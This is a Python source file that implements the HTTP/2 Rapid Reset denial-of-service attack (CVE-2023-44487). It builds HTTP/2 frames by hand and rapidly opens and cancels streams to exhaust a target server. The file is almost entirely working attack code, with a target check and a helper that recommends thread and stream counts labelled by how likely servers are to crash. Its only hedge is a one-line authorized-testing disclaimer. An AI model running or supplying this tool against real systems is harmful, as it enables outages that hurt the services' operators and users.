#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HTTP/2 Rapid Reset Attack (CVE-2023-44487)
==========================================

Exploits HTTP/2 stream cancellation to exhaust server resources.

How it works:
1. Establish HTTP/2 connection (TLS ALPN negotiation)
2. Send SETTINGS frame to initialize connection
3. Rapidly send many HEADERS frames (new streams)
4. Immediately send RST_STREAM for each stream
5. Server allocates resources but doesn't cleanup fast enough
6. Repeat → resource exhaustion → DoS

This attack was discovered in 2023 and affected:
- Cloudflare
- Google (GFE)
- Amazon AWS
- Nginx
- Apache
- Many CDNs and load balancers

LEGAL DISCLAIMER:
    For AUTHORIZED TESTING ONLY. Requires written permission.
"""

import socket
import ssl
import struct
import logging
import time
from typing import Optional, Callable
from enum import IntEnum

# ============================================================================
# HTTP/2 FRAME TYPES (RFC 7540)
# ============================================================================

class FrameType(IntEnum):
    """HTTP/2 frame types"""
    DATA = 0x0
    HEADERS = 0x1
    PRIORITY = 0x2
    RST_STREAM = 0x3
    SETTINGS = 0x4
    PUSH_PROMISE = 0x5
    PING = 0x6
    GOAWAY = 0x7
    WINDOW_UPDATE = 0x8
    CONTINUATION = 0x9

class FrameFlags(IntEnum):
    """HTTP/2 frame flags"""
    END_STREAM = 0x1
    END_HEADERS = 0x4
    PADDED = 0x8
    PRIORITY = 0x20

class ErrorCode(IntEnum):
    """HTTP/2 error codes"""
    NO_ERROR = 0x0
    PROTOCOL_ERROR = 0x1
    INTERNAL_ERROR = 0x2
    FLOW_CONTROL_ERROR = 0x3
    SETTINGS_TIMEOUT = 0x4
    STREAM_CLOSED = 0x5
    FRAME_SIZE_ERROR = 0x6
    REFUSED_STREAM = 0x7
    CANCEL = 0x8
    COMPRESSION_ERROR = 0x9
    CONNECT_ERROR = 0xa
    ENHANCE_YOUR_CALM = 0xb
    INADEQUATE_SECURITY = 0xc
    HTTP_1_1_REQUIRED = 0xd

# ============================================================================
# HTTP/2 FRAME BUILDER
# ============================================================================

class HTTP2Frame:
    """Build HTTP/2 frames manually (no external library needed)"""
    
    # HTTP/2 Connection Preface (magic string)
    CONNECTION_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    
    @staticmethod
    def build_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
        """
        Build HTTP/2 frame
        
        Frame format (RFC 7540):
        +-----------------------------------------------+
        |                 Length (24)                   |
        +---------------+---------------+---------------+
        |   Type (8)    |   Flags (8)   |
        +-+-------------+---------------+-------------------------------+
        |R|                 Stream Identifier (31)                      |
        +=+=============================================================+
        |                   Frame Payload (0...)                      ...
        +---------------------------------------------------------------+
        
        Args:
            frame_type: Frame type (0-9)
            flags: Frame flags (8 bits)
            stream_id: Stream ID (31 bits, MSB reserved)
            payload: Frame payload bytes
            
        Returns:
            Complete HTTP/2 frame bytes
        """
        length = len(payload)
        
        # Length (3 bytes, big-endian)
        length_bytes = struct.pack('!I', length)[1:]  # Take last 3 bytes
        
        # Type (1 byte)
        type_byte = struct.pack('!B', frame_type)
        
        # Flags (1 byte)
        flags_byte = struct.pack('!B', flags)
        
        # Stream ID (4 bytes, big-endian, MSB reserved = 0)
        stream_id_bytes = struct.pack('!I', stream_id & 0x7FFFFFFF)
        
        # Combine: 9-byte header + payload
        frame = length_bytes + type_byte + flags_byte + stream_id_bytes + payload
        return frame
    
    @staticmethod
    def build_settings_frame(ack: bool = False, settings: Optional[dict] = None) -> bytes:
        """
        Build SETTINGS frame
        
        Args:
            ack: If True, build SETTINGS ACK (empty payload)
            settings: Dict of setting_id -> value
            
        Returns:
            SETTINGS frame bytes
        """
        if ack:
            # SETTINGS ACK (empty payload, ACK flag = 0x1)
            return HTTP2Frame.build_frame(
                frame_type=FrameType.SETTINGS,
                flags=0x1,
                stream_id=0,
                payload=b''
            )
        
        # Build settings payload
        payload = b''
        if settings:
            for setting_id, value in settings.items():
                # Each setting: 2 bytes ID + 4 bytes value
                payload += struct.pack('!HI', setting_id, value)
        
        return HTTP2Frame.build_frame(
            frame_type=FrameType.SETTINGS,
            flags=0,
            stream_id=0,
            payload=payload
        )
    
    @staticmethod
    def build_headers_frame(stream_id: int, headers: bytes, end_stream: bool = False, end_headers: bool = True) -> bytes:
        """
        Build HEADERS frame
        
        Args:
            stream_id: Stream ID (must be odd for client-initiated)
            headers: Encoded headers (HPACK encoded)
            end_stream: END_STREAM flag
            end_headers: END_HEADERS flag
            
        Returns:
            HEADERS frame bytes
        """
        flags = 0
        if end_stream:
            flags |= FrameFlags.END_STREAM
        if end_headers:
            flags |= FrameFlags.END_HEADERS
        
        return HTTP2Frame.build_frame(
            frame_type=FrameType.HEADERS,
            flags=flags,
            stream_id=stream_id,
            payload=headers
        )
    
    @staticmethod
    def build_rst_stream_frame(stream_id: int, error_code: int = ErrorCode.CANCEL) -> bytes:
        """
        Build RST_STREAM frame (stream cancellation)
        
        Args:
            stream_id: Stream ID to cancel
            error_code: HTTP/2 error code (default: CANCEL)
            
        Returns:
            RST_STREAM frame bytes
        """
        # Payload: 4 bytes error code
        payload = struct.pack('!I', error_code)
        
        return HTTP2Frame.build_frame(
            frame_type=FrameType.RST_STREAM,
            flags=0,
            stream_id=stream_id,
            payload=payload
        )
    
    @staticmethod
    def build_ping_frame(data: bytes = b'\x00' * 8, ack: bool = False) -> bytes:
        """
        Build PING frame
        
        Args:
            data: 8 bytes opaque data
            ack: PING ACK flag
            
        Returns:
            PING frame bytes
        """
        if len(data) != 8:
            data = data[:8].ljust(8, b'\x00')
        
        flags = 0x1 if ack else 0
        
        return HTTP2Frame.build_frame(
            frame_type=FrameType.PING,
            flags=flags,
            stream_id=0,
            payload=data
        )

# ============================================================================
# SIMPLE HPACK ENCODER (for HEADERS)
# ============================================================================

class SimpleHPACK:
    """
    Simplified HPACK encoder for HTTP/2 HEADERS
    
    This is a minimal implementation - just enough for the attack.
    For production, use hpack library.
    """
    
    @staticmethod
    def encode_headers(method: str, path: str, authority: str, scheme: str = "https") -> bytes:
        """
        Encode HTTP headers using HPACK (simplified - literal encoding)
        
        For the attack, we don't need optimal compression.
        We'll use literal encoding (no indexing).
        
        Format: 0x00 (literal, no indexing) + name_len + name + value_len + value
        """
        headers_to_encode = [
            (":method", method),
            (":path", path),
            (":scheme", scheme),
            (":authority", authority),
        ]
        
        encoded = b''
        for name, value in headers_to_encode:
            # Literal header field without indexing (0x00 prefix)
            encoded += b'\x00'
            
            # Name length (7-bit prefix, no Huffman)
            name_bytes = name.encode('utf-8')
            encoded += struct.pack('!B', len(name_bytes))
            encoded += name_bytes
            
            # Value length (7-bit prefix, no Huffman)
            value_bytes = value.encode('utf-8')
            encoded += struct.pack('!B', len(value_bytes))
            encoded += value_bytes
        
        return encoded

# ============================================================================
# HTTP/2 RAPID RESET ATTACK
# ============================================================================

class H2RapidResetAttack:
    """
    HTTP/2 Rapid Reset Attack (CVE-2023-44487)
    
    Rapidly creates and cancels HTTP/2 streams to exhaust server resources.
    """
    
    def __init__(
        self,
        target_host: str,
        target_port: int,
        streams_per_connection: int = 1000,
        reset_delay: float = 0.0,
        worker_id: int = 0,
        use_alpn: bool = True
    ):
        """
        Initialize HTTP/2 Rapid Reset attacker
        
        Args:
            target_host: Target hostname or IP
            target_port: Target port (usually 443 for HTTPS)
            streams_per_connection: Number of streams to create per connection
            reset_delay: Delay between stream creation and RST (0 = immediate)
            worker_id: Worker ID for logging
            use_alpn: Use ALPN negotiation for HTTP/2
        """
        self.target_host = target_host
        self.target_port = target_port
        self.streams_per_connection = streams_per_connection
        self.reset_delay = reset_delay
        self.worker_id = worker_id
        self.use_alpn = use_alpn
        
        # Stream ID counter (client-initiated streams are odd)
        self.next_stream_id = 1
    
    def create_http2_connection(self, sock: socket.socket, sni_hostname: Optional[str] = None) -> ssl.SSLSocket:
        """
        Wrap socket with TLS and negotiate HTTP/2 via ALPN
        
        Args:
            sock: Plain socket
            sni_hostname: SNI hostname (default: target_host)
            
        Returns:
            TLS-wrapped socket with HTTP/2 negotiated
            
        Raises:
            ssl.SSLError: TLS handshake failed
            ValueError: HTTP/2 not negotiated
        """
        # Create SSL context
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        # Set ALPN protocols (HTTP/2 = "h2")
        if self.use_alpn:
            context.set_alpn_protocols(['h2', 'http/1.1'])
        
        # Wrap socket with TLS
        sni = sni_hostname or self.target_host
        tls_sock = context.wrap_socket(sock, server_hostname=sni)
        
        # Check ALPN negotiation result
        if self.use_alpn:
            selected_protocol = tls_sock.selected_alpn_protocol()
            logging.debug(f"Worker {self.worker_id}: ALPN selected protocol: {selected_protocol}")
            
            if selected_protocol != 'h2':
                raise ValueError(f"HTTP/2 not negotiated (got: {selected_protocol})")
        
        return tls_sock
    
    def send_connection_preface(self, sock: ssl.SSLSocket):
        """
        Send HTTP/2 connection preface and SETTINGS frame
        
        Args:
            sock: TLS socket
        """
        # 1. Send connection preface (magic string)
        sock.sendall(HTTP2Frame.CONNECTION_PREFACE)
        
        # 2. Send initial SETTINGS frame
        settings = {
            0x3: 100,      # SETTINGS_MAX_CONCURRENT_STREAMS = 100
            0x4: 65535,    # SETTINGS_INITIAL_WINDOW_SIZE = 65535
        }
        settings_frame = HTTP2Frame.build_settings_frame(settings=settings)
        sock.sendall(settings_frame)
        
        logging.debug(f"Worker {self.worker_id}: Sent connection preface and SETTINGS")
    
    def receive_settings(self, sock: ssl.SSLSocket, timeout: float = 2.0):
        """
        Receive server's SETTINGS frame and send ACK
        
        Args:
            sock: TLS socket
            timeout: Receive timeout
        """
        sock.settimeout(timeout)
        
        try:
            # Read frame header (9 bytes)
            frame_header = sock.recv(9)
            if len(frame_header) < 9:
                return
            
            # Parse frame header
            length = struct.unpack('!I', b'\x00' + frame_header[0:3])[0]
            frame_type = frame_header[3]
            
            # Read payload
            if length > 0:
                payload = sock.recv(length)
            
            logging.debug(f"Worker {self.worker_id}: Received frame type {frame_type}, length {length}")
            
            # If SETTINGS frame, send ACK
            if frame_type == FrameType.SETTINGS:
                ack_frame = HTTP2Frame.build_settings_frame(ack=True)
                sock.sendall(ack_frame)
                logging.debug(f"Worker {self.worker_id}: Sent SETTINGS ACK")
        
        except socket.timeout:
            logging.debug(f"Worker {self.worker_id}: Timeout waiting for SETTINGS")
        except Exception as e:
            logging.debug(f"Worker {self.worker_id}: Error receiving SETTINGS: {e}")
    
    def execute_rapid_reset(
        self,
        sock: ssl.SSLSocket,
        stats_callback: Optional[Callable] = None
    ) -> int:
        """
        Execute rapid reset attack - spam HEADERS + RST_STREAM
        
        Args:
            sock: HTTP/2 connection (TLS socket)
            stats_callback: Callback to update statistics
            
        Returns:
            Number of streams created+reset
        """
        streams_sent = 0
        
        try:
            for i in range(self.streams_per_connection):
                # Get next stream ID (odd numbers for client)
                stream_id = self.next_stream_id
                self.next_stream_id += 2
                
                # 1. Build and send HEADERS frame
                headers_payload = SimpleHPACK.encode_headers(
                    method="GET",
                    path=f"/attack?id={stream_id}",
                    authority=self.target_host,
                    scheme="https"
                )
                
                headers_frame = HTTP2Frame.build_headers_frame(
                    stream_id=stream_id,
                    headers=headers_payload,
                    end_stream=False,
                    end_headers=True
                )
                
                sock.sendall(headers_frame)
                
                if stats_callback:
                    stats_callback()  # Count packet sent
                
                # 2. Optional delay before RST
                if self.reset_delay > 0:
                    time.sleep(self.reset_delay)
                
                # 3. Immediately send RST_STREAM to cancel
                rst_frame = HTTP2Frame.build_rst_stream_frame(
                    stream_id=stream_id,
                    error_code=ErrorCode.CANCEL
                )
                
                sock.sendall(rst_frame)
                
                if stats_callback:
                    stats_callback()  # Count packet sent
                
                streams_sent += 1
                
                # Optional: small delay to avoid overwhelming socket buffer
                if i % 100 == 0 and i > 0:
                    time.sleep(0.001)  # 1ms pause every 100 streams
            
            logging.debug(f"Worker {self.worker_id}: Sent {streams_sent} rapid reset streams")
            return streams_sent
        
        except Exception as e:
            logging.error(f"Worker {self.worker_id}: Rapid reset error: {e}")
            return streams_sent
    
    def execute_attack(
        self,
        sock: socket.socket,
        spoofed_ip: Optional[str],
        stats_callback: Optional[Callable] = None,
        sni_hostname: Optional[str] = None
    ) -> bool:
        """
        Complete attack flow: TLS + HTTP/2 + Rapid Reset
        
        Args:
            sock: Plain TCP socket (connected)
            spoofed_ip: Spoofed IP (unused for HTTP/2, here for compatibility)
            stats_callback: Stats callback
            sni_hostname: SNI hostname for TLS
            
        Returns:
            True if attack completed successfully
        """
        try:
            # 1. Upgrade to HTTP/2 connection
            tls_sock = self.create_http2_connection(sock, sni_hostname)
            
            # 2. Send connection preface
            self.send_connection_preface(tls_sock)
            
            # 3. Receive server SETTINGS and ACK
            self.receive_settings(tls_sock)
            
            # 4. Execute rapid reset attack
            streams_sent = self.execute_rapid_reset(tls_sock, stats_callback)
            
            logging.info(f"Worker {self.worker_id}: HTTP/2 rapid reset completed ({streams_sent} streams)")
            return True
        
        except ValueError as e:
            # HTTP/2 not supported
            logging.warning(f"Worker {self.worker_id}: {e}")
            return False
        
        except ssl.SSLError as e:
            logging.error(f"Worker {self.worker_id}: TLS error: {e}")
            return False
        
        except Exception as e:
            logging.error(f"Worker {self.worker_id}: Attack error: {e}")
            return False

# ============================================================================
# HELPER UTILITIES
# ============================================================================

class H2RapidResetHelper:
    """Helper utilities for HTTP/2 rapid reset attack"""
    
    @staticmethod
    def calculate_streams_per_second(streams_per_conn: int, reset_delay: float) -> float:
        """
        Calculate streams per second rate
        
        Args:
            streams_per_conn: Streams per connection
            reset_delay: Delay between HEADERS and RST
            
        Returns:
            Streams per second
        """
        if reset_delay == 0:
            # Assuming ~100μs per stream pair (HEADERS + RST)
            return streams_per_conn / 0.01  # Very fast!
        else:
            return streams_per_conn / (streams_per_conn * reset_delay)
    
    @staticmethod
    def suggest_parameters(target_strength: str) -> dict:
        """
        Suggest attack parameters based on target strength
        
        Args:
            target_strength: "weak", "medium", "strong"
            
        Returns:
            Dict with suggested parameters
        """
        params = {
            "weak": {
                "threads": 10,
                "streams_per_connection": 500,
                "reset_delay": 0.0,
                "estimated_impact": "High - small servers will crash"
            },
            "medium": {
                "threads": 50,
                "streams_per_connection": 1000,
                "reset_delay": 0.0,
                "estimated_impact": "Very High - most servers will struggle"
            },
            "strong": {
                "threads": 100,
                "streams_per_connection": 2000,
                "reset_delay": 0.0,
                "estimated_impact": "Extreme - enterprise servers may crash"
            }
        }
        
        return params.get(target_strength.lower(), params["medium"])
    
    @staticmethod
    def check_http2_support(host: str, port: int, timeout: float = 5.0) -> bool:
        """
        Check if target supports HTTP/2
        
        Args:
            host: Target hostname
            port: Target port
            timeout: Connection timeout
            
        Returns:
            True if HTTP/2 supported
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            
            # Create SSL context with ALPN
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_alpn_protocols(['h2', 'http/1.1'])
            
            # TLS handshake
            tls_sock = context.wrap_socket(sock, server_hostname=host)
            
            # Check ALPN result
            protocol = tls_sock.selected_alpn_protocol()
            
            tls_sock.close()
            
            return protocol == 'h2'
        
        except Exception as e:
            logging.debug(f"HTTP/2 check failed: {e}")
            return False
